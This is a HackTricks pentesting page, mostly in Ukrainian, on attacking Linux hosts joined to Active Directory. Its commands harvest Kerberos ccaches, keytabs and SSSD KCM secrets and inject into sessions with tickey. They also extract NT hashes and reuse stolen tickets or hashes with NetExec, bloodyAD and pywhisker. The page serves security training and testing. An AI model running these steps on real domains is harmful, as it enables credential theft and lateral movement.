# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Машина Linux також може бути присутня в середовищі Active Directory.

Машина Linux в AD може **зберігати Kerberos-матеріали локально**: user ccaches, machine/service keytabs і secrets, якими керує SSSD. Ці artefacts зазвичай можна повторно використати як будь-які інші Kerberos credentials. Щоб прочитати більшість із них, вам потрібно бути власником користувача ticket або **root** на машині.

## Enumeration

### AD enumeration from linux

Якщо у вас є доступ до AD у linux (або bash у Windows), ви можете спробувати [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) для enumeration AD.

Ви також можете переглянути наступну сторінку, щоб дізнатися **інші способи enumerate AD from linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA — це open-source **альтернатива** Microsoft Windows **Active Directory**, головним чином для **Unix**-середовищ. Вона поєднує повноцінний **LDAP** directory з MIT **Kerberos** Key Distribution Center для керування, подібного до Active Directory. Використовуючи Dogtag **Certificate System** для керування CA & RA certificate, вона підтримує **multi-factor** authentication, включно зі smartcards. SSSD інтегровано для процесів Unix authentication. Дізнайтеся більше про це тут:


{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Перед тим як працювати з tickets, визначте **як host було joined до AD** і **де насправді зберігається Kerberos material**. На сучасних Linux hosts це зазвичай обробляється `realmd` + `adcli` + `sssd`, а не просто flat files у `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Це швидко показує, чи довіряє host AD, чи SSSD кешує identities або tickets, і чи доступні для abuse **machine/service keytabs** або **KCM secrets**.

## Playing with tickets

### Pass The Ticket

На цій сторінці ви знайдете різні місця, де можна **знайти kerberos tickets всередині linux host**, на наступній сторінці ви можете дізнатися, як перетворити ці формати CCache tickets у Kirbi (формат, який потрібно використовувати у Windows), а також як виконати атаку PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Якщо вам потрібні **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, тощо), дивіться окрему сторінку:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

Файли CCACHE — це бінарні формати для **зберігання Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` усе ще поширений, але сучасні Linux deployments також використовують `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, або `KCM:%{uid}`. Перевірте змінну середовища **`KRB5CCNAME`** і налаштування `default_ccache_name` перед тим, як припускати, що tickets лежать у `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE ticket reuse from keyring

**Kerberos tickets, stored in a process's memory, can be extracted**, particularly when the machine's ptrace protection is disabled (`/proc/sys/kernel/yama/ptrace_scope`). A useful tool for this purpose is found at [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), which facilitates the extraction by injecting into sessions and dumping tickets into `/tmp`.

To configure and use this tool, the steps below are followed:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ця процедура спробує інжектувати в різні сесії, позначаючи успіх шляхом збереження витягнутих tickets у `/tmp` із шаблоном іменування `__krb_UID.ccache`.

### Повторне використання CCACHE ticket з SSSD KCM

SSSD зберігає копію бази даних за шляхом `/var/lib/sss/secrets/secrets.ldb`. Відповідний key зберігається як прихований файл за шляхом `/var/lib/sss/secrets/.secrets.mkey`. За замовчуванням, key можна прочитати лише якщо у вас є права **root**.

Запуск **`SSSDKCMExtractor`** з параметрами --database і --key розпарсить базу даних і **decrypt the secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Блоб Kerberos з **credential cache** може бути перетворений у придатний до використання файл Kerberos CCache, який можна передати до Mimikatz/Rubeus.

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Витягнення облікових записів із /etc/krb5.keytab

Ключі service account, важливі для сервісів, що працюють із привілеями root, безпечно зберігаються у файлах **`/etc/krb5.keytab`**. Ці ключі, подібні до паролів для сервісів, вимагають суворої конфіденційності.

Щоб переглянути вміст keytab-файлу, можна використати **`klist`**. У Linux, `klist -k -K -e` виводить principals, номери версій ключів, типи шифрування та raw key material. Якщо тип ключа — **23 / RC4-HMAC**, значення ключа також є **NT hash** цього principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Для користувачів Linux, **`KeyTabExtract`** пропонує функціональність для вилучення хеша RC4 HMAC, який можна використати для повторного застосування NTLM hash. Зверніть увагу, що це допомагає лише тоді, коли keytab все ще містить матеріал **etype 23 / RC4-HMAC**. В **AES-only** середовищах ви можете не отримати повторно придатний NT hash, але все ще можете автентифікуватися безпосередньо за допомогою keytab через Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
На macOS, **`bifrost`** служить інструментом для аналізу файлів keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Використовуючи витягнуту інформацію про account і hash, можна встановлювати connections до servers за допомогою tools like **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Повторне використання machine account з `/etc/krb5.keytab`

На системах, приєднаних через `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` зазвичай містить **computer account** і один або кілька **host/service principals**. Якщо у вас є **root**, не просто дампіть його: використайте один із principals, перелічених через `klist -k`, щоб запросити TGT і працювати як сам Linux host.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Це особливо корисно, коли сам **computer object** має делеговані права в AD або коли хосту дозволено отримувати інші секрети, такі як **gMSA**.

### Reuse stolen Kerberos material with Linux-first AD tooling

Після того як у вас є валідний `ccache` або придатний keytab, ви можете працювати з AD **безпосередньо з Linux** без попереднього конвертування всього у Windows-формати. Багато сучасних інструментів нативно підтримують `KRB5CCNAME` / Kerberos auth:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Це хороший місток між **Linux post-exploitation** та **AD object abuse**. Для самих шляхів abuse на рівні об’єктів дивіться:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Останні Linux deployments можуть напряму використовувати **Managed Service Accounts** з AD. На практиці це означає, що після компрометації Linux-сервера ви можете знайти не лише host keytab, але й **service-specific keytabs**, згенеровані з gMSA. Типові місця для перевірки: `/etc/gmsad.conf`, deployment-specific config files та додаткові `*.keytab` файли в `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Це дає вам повторно використовувану Kerberos identity для SPNs, прив’язаних до цього gMSA, **без доторкання до будь-якого Windows endpoint**. Для **domain-side** зловживання gMSA/dMSA після вищих привілеїв в AD, дивіться:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
